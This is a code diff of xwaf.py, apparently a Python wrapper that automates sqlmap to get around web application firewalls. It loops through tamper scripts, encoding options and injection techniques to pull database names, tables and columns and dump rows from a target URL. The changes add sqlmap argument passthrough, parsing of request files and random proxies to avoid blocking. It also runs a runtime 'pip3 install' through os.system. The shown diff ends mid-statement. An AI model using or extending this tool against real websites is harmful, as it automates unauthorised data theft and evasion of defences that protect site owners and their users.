@@ -12,12 +12,16 @@ try:
     from exp10it import update_config_file_key_value
     from exp10it import get_key_value_from_config_file
     from exp10it import CLIOutput
+    from exp10it import get_input_intime
+    from exp10it import get_http_or_https
 except:
-    os.system("pip3 install exp10it")
+    os.system("pip3 install exp10it -U --no-cache")
     from exp10it import figlet2file
     from exp10it import update_config_file_key_value
     from exp10it import get_key_value_from_config_file
     from exp10it import CLIOutput
+    from exp10it import get_input_intime
+    from exp10it import get_http_or_https
 
 
 class Program(object):
@@ -25,6 +29,8 @@ class Program(object):
     def __init__(self):
         self.output = CLIOutput()
         self.try_times = 0
+        #rflag为1代表sqlmap的参数中有-r选项
+        self.rflag=0
         self.useProxy=False
         figlet2file("xwaf", 0, True)
         self.handle_url()
@@ -35,7 +41,11 @@ class Program(object):
         self.output.useProxy=self.useProxy
         parsed = urlparse(self.url)
         safe_url = parsed.scheme + "://" + parsed.netloc
-        self.sm_command = '''sqlmap -u "%s" --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --level 3''' % (self.url, safe_url)
+        if self.rflag==0:
+            self.sm_command = '''sqlmap -u "%s" --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --level 3''' % (self.url, safe_url)
+        else:
+            self.sm_command = '''sqlmap --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --level 3''' % safe_url
+
         self.sm_hex_command = self.sm_command + " --hex"
         self.sm_no_cast_command = self.sm_command + " --no-cast"
         # 下面两句初始化产生的内容为hex_or_no_cast列表和tamper_list列表的配置文件
@@ -95,7 +105,7 @@ class Program(object):
             if self.sm_command in current_finished_command_list:
                 pass
             else:
-                self.output.os_system_with_bottom_status(self.sm_command)
+                self.output.os_system_combine_argv_with_bottom_status(self.sm_command)
                 current_finished_command_list.append(self.sm_command)
                 update_config_file_key_value(self.log_config_file, 'default','finished_command_list', current_finished_command_list)
         has_sqli = self.get_log_file_need_tamper()
@@ -135,34 +145,64 @@ class Program(object):
         self.get_column_name_need_tamper()
         has_entries = self.get_entries_need_tamper()
         if has_entries == 1:
-            self.output.good_print("成功获取数据的命令是:\n%s" % eval(get_key_value_from_config_file(
-                self.log_config_file, 'default', 'bypassed_command')), 'red')
+            succeedCmd=eval(get_key_value_from_config_file(self.log_config_file, 'default', 'bypassed_command'))
+            self.output.good_print("成功获取数据的命令是:\n%s" % succeedCmd, 'red')
 
         self.output.good_print('you tried %d times' % self.try_times, 'red')
 
 
     def handle_url(self):
         if len(sys.argv) == 1:
-            self.output.good_print('''you can use this script like this:\n%s eg."https://www.baidu.com/index.php?id=1"\n or''' %
-                                   sys.argv[0], 'yellow')
-            self.output.good_print('please input your url:>', 'yellow')
-            self.url = input()
-            choose=input("do you want to use proxy? Y|N ? default[n]")
+            self.output.good_print('''You can use this script like this:\neg."python3 xwaf.py -u \
+"https://www.baidu.com/index.php?id=1"\nActually,xwaf.py supports all parameters in sqlmap,you can use \
+it like sqlmap.''','yellow')
+            sys.exit(1)
+        else:
+            if "-m" in sys.argv[1:] or "-l" in sys.argv[1:]:
+                print("Sorry,xwaf.py does not support param '-m' and '-l'")
+                sys.exit(1)
+
+            print("Do you want to use random proxy from the Internet on each different sqlmap command to anti \
+blocked by waf for your mass requests? [N|y]")
+            choose=get_input_intime('n',5)
             if choose=='y' or choose=='Y':
                 self.useProxy=True
-        elif len(sys.argv) == 2:
-            self.url = sys.argv[1]
-            if re.match(r"http", self.url):
-                pass
-            else:
-                self.output.good_print("you can use this script like this:\n%s eg.https://www.baidu.com/index.php?id=1\n or" %
-                                       sys.argv[0], 'yellow')
-                print('please input your url:>')
-                self.url = input()
-        elif len(sys.argv)==3:
-            self.url=sys.argv[1]
-            if sys.argv[2]=="--proxy":
-                self.useProxy=True
+
+            self.url=""
+            tmp=sys.argv[1:] 
+            index=0
+            for each in tmp:
+                if each=="-u":
+                    self.url=tmp[index+1]
+                    break
+                index+=1
+            if self.url=="":
+                if "-r" in sys.argv[1:]:
+                    self.rflag=1
+                    tmpIndex=0
+                    tmpList=sys.argv[1:]
+                    for each in tmpList:
+                        if each=="-r":
+                            readFile=tmpList[tmpIndex+1]
+                            break
+                        tmpIndex+=1
+                    with open(readFile,"r+") as f:
+                        allLines=f.readlines()
+                    findHost=0
+                    for eachLine in allLines:
+                        if re.search("host:",eachLine,re.I):
+                            hostValue=re.search("host:\s?([\S]+)",eachLine,re.I).group(1)
+                            self.url=get_http_or_https(hostValue)+"://"+hostValue
+                            findHost=1
+                            break
+                    if findHost==0:
+                        print("Although you provide a header file,but I can not find host value")
+                        sys.exit(1)
+                else:
+                    print("Sorry,I can not find a url:(")
+                    sys.exit(1)
+
+
 
     def get_db_type_from_log_file(self, log_file):
         with open(log_file, "r+") as f:
@@ -423,7 +463,7 @@ class Program(object):
                 if self.sm_command_with_tamper in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command_with_tamper)
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper)
                     current_finished_command_list.append(self.sm_command_with_tamper)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -439,7 +479,7 @@ class Program(object):
                     if self.sm_hex_command_with_tamper in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper)
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper)
                         current_finished_command_list.append(self.sm_hex_command_with_tamper)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -457,7 +497,7 @@ class Program(object):
                     if self.sm_no_cast_command_with_tamper in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper)
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper)
                         current_finished_command_list.append(self.sm_no_cast_command_with_tamper)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -480,7 +520,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command_with_tamper in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
                     current_finished_command_list.append(sm_hex_or_no_cast_command_with_tamper)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -522,7 +562,7 @@ class Program(object):
                 if self.sm_command_with_tamper in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command_with_tamper)
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper)
                     current_finished_command_list.append(self.sm_command_with_tamper)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -538,7 +578,7 @@ class Program(object):
                     if self.sm_hex_command_with_tamper in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper)
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper)
                         current_finished_command_list.append(self.sm_hex_command_with_tamper)
                         update_config_file_key_value(self.log_config_file, 'default',
                                                      'finished_command_list', current_finished_command_list)
@@ -556,7 +596,7 @@ class Program(object):
                         if self.sm_no_cast_command_with_tamper in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper)
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper)
                             current_finished_command_list.append(self.sm_no_cast_command_with_tamper)
                             update_config_file_key_value(self.log_config_file, 'default',
                                                          'finished_command_list', current_finished_command_list)
@@ -579,7 +619,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command_with_tamper in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
                     current_finished_command_list.append(sm_hex_or_no_cast_command_with_tamper)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -620,7 +660,7 @@ class Program(object):
                 if self.sm_command_with_tamper + " --technique=USE" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE")
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE")
                     current_finished_command_list.append(self.sm_command_with_tamper + " --technique=USE")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -637,7 +677,7 @@ class Program(object):
                     if self.sm_hex_command_with_tamper + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_hex_command_with_tamper + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_hex_command_with_tamper + " --technique=USE")
@@ -658,7 +698,7 @@ class Program(object):
                         if self.sm_no_cast_command_with_tamper + " --technique=USE" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(
+                            self.output.os_system_combine_argv_with_bottom_status(
                                 self.sm_no_cast_command_with_tamper + " --technique=USE")
                             current_finished_command_list.append(
                                 self.sm_no_cast_command_with_tamper + " --technique=USE")
@@ -682,7 +722,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command_with_tamper in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
                     current_finished_command_list.append(sm_hex_or_no_cast_command_with_tamper)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -726,7 +766,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_command_with_tamper + " --technique=USE" + " --current-db")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=USE" + " --current-db")
@@ -745,7 +785,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
@@ -765,7 +805,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(
+                            self.output.os_system_combine_argv_with_bottom_status(
                                 self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
@@ -786,7 +826,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(
+                            self.output.os_system_combine_argv_with_bottom_status(
                                 self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
@@ -807,7 +847,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                          " --technique=USE" + " --current-db")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=USE" + " --current-db")
@@ -828,7 +868,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                          " --technique=BQT" + " --current-db")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --current-db")
@@ -856,7 +896,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             sm_hex_or_no_cast_command_with_tamper + " --current-db")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " --current-db")
@@ -876,7 +916,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " --current-db" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             sm_hex_or_no_cast_command_with_tamper + " --current-db")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " --current-db")
@@ -922,7 +962,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + " --tables")
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + " --tables")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=USE" + " --tables")
                         update_config_file_key_value(self.log_config_file, 'default',
@@ -940,7 +980,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
                                                                  " --tables")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=BQT" + " --tables")
@@ -960,7 +1000,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
                                                                      " --tables")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=USE" + " --tables")
@@ -981,7 +1021,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
                                                                      " --tables")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=BQT" + " --tables")
@@ -1003,7 +1043,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                          " --technique=USE" + " --tables")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=USE" + " --tables")
@@ -1024,7 +1064,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                          " --technique=BQT" + " --tables")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --tables")
@@ -1052,7 +1092,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             sm_hex_or_no_cast_command_with_tamper + " --tables")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " --tables")
@@ -1072,7 +1112,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " --tables" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             sm_hex_or_no_cast_command_with_tamper + " --tables")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " --tables")
@@ -1119,7 +1159,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" +
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" +
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
@@ -1138,7 +1178,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
@@ -1158,7 +1198,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
                                                                      " -T " + table_name + " --columns")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
@@ -1179,7 +1219,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
                                                                      " -T " + table_name + " --columns")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
@@ -1201,7 +1241,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
                                                                          " -T " + table_name + " --columns")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
@@ -1222,7 +1262,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
                                                                          " -T " + table_name + " --columns")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
@@ -1250,7 +1290,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns")
@@ -1270,7 +1310,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                  " -T " + table_name + " --columns")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns")
@@ -1317,7 +1357,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
@@ -1338,7 +1378,7 @@ class Program(object):
                     if self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" + 
+                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
@@ -1360,7 +1400,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" + 
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" + 
                                                                      " -T " + table_name + " --dump --stop 3")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
@@ -1383,7 +1423,7 @@ class Program(object):
                         if self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                             pass
                         else:
-                            self.output.os_system_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" + 
+                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" + 
                                                                      " -T " + table_name + " --dump --stop 3")
                             current_finished_command_list.append(
                                 self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
@@ -1407,7 +1447,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
                                                                          " -T " + table_name + " --dump --stop 3")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
@@ -1430,7 +1470,7 @@ class Program(object):
                             if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                                 pass
                             else:
-                                self.output.os_system_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
+                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
                                                                          " -T " + table_name + " --dump --stop 3")
                                 current_finished_command_list.append(
                                     self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
@@ -1460,7 +1500,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3")
@@ -1482,7 +1522,7 @@ class Program(object):
                     if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
+                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                  " -T " + table_name + " --dump --stop 3")
                         current_finished_command_list.append(
                             sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --dump --stop 3")
@@ -1575,7 +1615,7 @@ class Program(object):
             if self.sm_hex_command in current_finished_command_list:
                 pass
             else:
-                self.output.os_system_with_bottom_status(self.sm_hex_command)
+                self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command)
                 current_finished_command_list.append(self.sm_hex_command)
                 update_config_file_key_value(self.log_config_file, 'default',
                                              'finished_command_list', current_finished_command_list)
@@ -1593,7 +1633,7 @@ class Program(object):
             if self.sm_no_cast_command in current_finished_command_list:
                 pass
             else:
-                self.output.os_system_with_bottom_status(self.sm_no_cast_command)
+                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command)
                 current_finished_command_list.append(self.sm_no_cast_command)
                 update_config_file_key_value(self.log_config_file, 'default',
                                              'finished_command_list', current_finished_command_list)
@@ -1647,7 +1687,7 @@ class Program(object):
                 if self.sm_hex_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command)
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command)
                     current_finished_command_list.append(self.sm_hex_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1664,7 +1704,7 @@ class Program(object):
                 if self.sm_no_cast_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command)
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command)
                     current_finished_command_list.append(self.sm_no_cast_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1685,7 +1725,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command)
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                     current_finished_command_list.append(sm_hex_or_no_cast_command)
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1746,7 +1786,7 @@ class Program(object):
                 if self.sm_command + " --technique=USE" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_command + " --technique=USE")
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=USE")
                     current_finished_command_list.append(self.sm_command + " --technique=USE")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1762,7 +1802,7 @@ class Program(object):
                 if self.sm_hex_command + " --technique=USE" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_hex_command + " --technique=USE")
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=USE")
                     current_finished_command_list.append(self.sm_hex_command + " --technique=USE")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1780,7 +1820,7 @@ class Program(object):
                 if self.sm_no_cast_command + " --technique=USE" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(self.sm_no_cast_command + " --technique=USE")
+                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=USE")
                     current_finished_command_list.append(self.sm_no_cast_command + " --technique=USE")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1802,7 +1842,7 @@ class Program(object):
                 if sm_hex_or_no_cast_command + " --technique=USE" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(sm_hex_or_no_cast_command + " --technique=USE")
+                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command + " --technique=USE")
                     current_finished_command_list.append(sm_hex_or_no_cast_command + " --technique=USE")
                     update_config_file_key_value(self.log_config_file, 'default',
                                                  'finished_command_list', current_finished_command_list)
@@ -1883,7 +1923,7 @@ class Program(object):
                     if self.sm_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                         pass
                     else:
-                        self.output.os_system_with_bottom_status(
+                        self.output.os_system_combine_argv_with_bottom_status(
                             self.sm_command + " --current-db" + " --technique=USE")
                         current_finished_command_list.append(
                             self.sm_command + " --current-db" + " --technique=USE")
@@ -1900,7 +1940,7 @@ class Program(object):
                 if self.sm_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                     pass
                 else:
-                    self.output.os_system_with_bottom_status(
+                    self.output.os_system_combine_argv_with_bottom_status(
